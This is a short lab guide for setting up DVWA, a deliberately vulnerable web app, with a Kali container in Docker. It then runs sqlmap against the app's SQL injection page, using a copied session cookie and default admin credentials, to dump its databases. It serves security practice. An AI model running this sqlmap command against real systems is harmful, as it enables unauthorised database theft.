# How to run and hack DVWA using Docker
1. Install Docker client
1. Run `docker-compose up` from a terminal
1. Navigate to `http://localhost/index.php`
1. Login with default DVWA credentials admin:password
1. Navigate to `http://localhost/setup.php` and click on the `Create / Reset Database` button
1. Login again at `http://localhost/index.php` using the same default credentials admin:password
1. Open the web developer tools and copy the value of PHPSESSID cookie
1. Run `docker container ls` to identify the kali container image name running (e.g. _kali-docker-test_kali_) and the dvwa container name (e.g. _kali-docker-test_dvwa_1_)
1. Run `docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' kali-docker-test_dvwa_1` to identify the ip of the dvwa container 
1. Open a new terminal and run `docker exec -ti kali-docker-test_kali_1 /bin/zsh`
1. From Kali, run `sqlmap --random-agent -u "http://<DVWA_IP>/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low;PHPSESSID=<SESSION_ID_COOKIE>" --level=5 --risk=3 -p id -a` and follow the instructions to dump the databases from DVWA
1. Go to the location `/root/.local/share/sqlmap/output/` to identify the dump from the attack
1. In a different terminal run `docker-compose down` to shutdown the lab